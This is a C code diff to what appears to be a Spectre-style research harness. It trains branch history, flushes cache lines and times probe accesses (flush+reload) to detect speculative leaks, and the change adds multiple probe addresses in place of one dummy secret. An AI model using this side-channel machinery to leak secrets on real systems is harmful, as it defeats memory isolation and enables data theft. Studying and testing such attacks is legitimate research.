@@ -14,10 +14,6 @@ uint64_t mem_threshold;
 __attribute__((aligned(4096))) 
 void *ib_ptr = &t_leak;
 
-__attribute__((aligned(4096))) 
-uint8_t dummy_secret = 12;
-void *ib_ptr_empty = &t_empty;
-
 void goto_chain(branch_chain_t br_chain, uint64_t *bh_targets, void **ib_ptr_p, int nr_cond_bh, void *frbuf, void *secret_p, uint64_t ex_argc, char **ex_argv)
 {
     // Populate BHB with conditional branches
@@ -76,15 +72,17 @@ void do_spectre_test(test_obj_t test_specs, int idx_test)
         char **ex_argv = test_chain->ex_argv;
 
         FLUSH_DCACHE(ib_ptr_p);
-        FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, secret_p));
         for (int i = 0; i < test_specs.nr_dc_flush; i++)
             FLUSH_DCACHE(test_specs.dc_flush[i]);
+        for (int i = 0; i < test_specs.nr_probes; i++)
+            FLUSH_DCACHE(SC_ENCODE_ADDR(_frbuf, test_specs.probes_p[i]));
         OPS_BARRIER(0x10);
 
         goto_chain(bh_tramp, bh_targets, ib_ptr_p, nr_cond_bh, _frbuf, secret_p, ex_argc, ex_argv);
         // Decode side channel to see if we have made it!
         OPS_BARRIER(0x10);
-        res_cycles[idx_test][test_iter] = mem_access_time(SC_ENCODE_ADDR(_frbuf, secret_p));
+        for (int i = 0; i < test_specs.nr_probes; i++)
+            res_cycles[idx_test][test_iter * test_specs.nr_probes + i] = mem_access_time(SC_ENCODE_ADDR(_frbuf, test_specs.probes_p[i]));
     }
 }
 
@@ -107,12 +105,12 @@ int main(int argc, char **argv)
 void init_res_buffers()
 {
     init_frbuf(256, SIZE_CACHE_STRIDE);
-    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secret), NR_TEST_ITER);
+    test_mem_latency(SC_ENCODE_ADDR(frbuf, &dummy_secrets[0]), NR_TEST_ITER);
     mem_threshold = mem_fast + (mem_slow - mem_fast)*0.2;
     print_cache_latency();
     res_cycles = malloc(run.nr_tests * sizeof(uint64_t));
     for (int i = 0; i < run.nr_tests; i++)
-        res_cycles[i] = malloc(run.tests[i]->nr_repeat * sizeof(uint64_t));
+        res_cycles[i] = malloc(run.tests[i]->nr_repeat * run.tests[i]->nr_probes * sizeof(uint64_t));
 }
 
 void init_trampolines()
@@ -133,9 +131,15 @@ void print_result()
     {
         uint64_t sum = 0;
         printf("--- Test %d: %s\n", i, run.tests[i]->description);
-        for (int round = 0; round < run.tests[i]->nr_repeat; round++)
-            sum += res_cycles[i][round];
-        printf("Probe access latency (average of %d tests): %d\n\n", run.tests[i]->nr_repeat, sum / run.tests[i]->nr_repeat);
+        printf("Probe access latency (average of %d tests):", run.tests[i]->nr_repeat);
+        for (int i_probe = 0; i_probe < run.tests[i]->nr_probes; i_probe++)
+        {
+            sum = 0;
+            for (int round = 0; round < run.tests[i]->nr_repeat; round++)
+                sum += res_cycles[i][round * run.tests[i]->nr_probes + i_probe];
+            printf(" %d", sum / run.tests[i]->nr_repeat);
+        }
+        printf("\n");
     }
 }
 
